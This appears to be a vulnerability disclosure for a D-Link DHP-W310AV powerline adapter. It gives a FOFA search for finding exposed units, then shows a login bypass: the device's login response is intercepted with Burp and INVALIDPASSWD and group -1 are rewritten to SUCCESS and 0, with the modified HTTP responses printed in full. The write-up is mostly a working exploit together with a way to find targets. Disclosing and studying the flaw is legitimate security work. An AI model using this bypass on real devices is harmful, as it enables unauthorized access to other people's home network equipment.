## supplier
[support.dlink.com](https://support.dlink.com/)
## describe
We can use fofa to find the asset of this device.
app="D_Link-无线电力猫"
![](img/image-20250127150542675.png)
We need to capture the login packet when entering the password, and then intercept the return packet.(Burp:Reponse to the request)
```
HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DHP-W310AV Ver 1.04
Date: Fri, 28 Jan 2000 22:00:30 GMT
Connection: close
Content-Type: text/xml
Content-Length: 168

<?xml version="1.0" encoding="utf-8"?>
<report>
	<RESULT>INVALIDPASSWD</RESULT>
	<REASON></REASON>
	<AUTHORIZED_GROUP>-1</AUTHORIZED_GROUP>
	<PELOTA></PELOTA>
</report>
```
I need to change INVALIDPASSWD to SUCCESS and -1 to 0.
```
HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DHP-W310AV Ver 1.04
Date: Fri, 28 Jan 2000 22:00:30 GMT
Connection: close
Content-Type: text/xml
Content-Length: 168

<?xml version="1.0" encoding="utf-8"?>
<report>
	<RESULT>SUCCESS</RESULT>
	<REASON></REASON>
	<AUTHORIZED_GROUP>0</AUTHORIZED_GROUP>
	<PELOTA></PELOTA>
</report>
```
Forward
![](img/image-20250127150952119.png)
In the end, I was not authorized to access the backend.
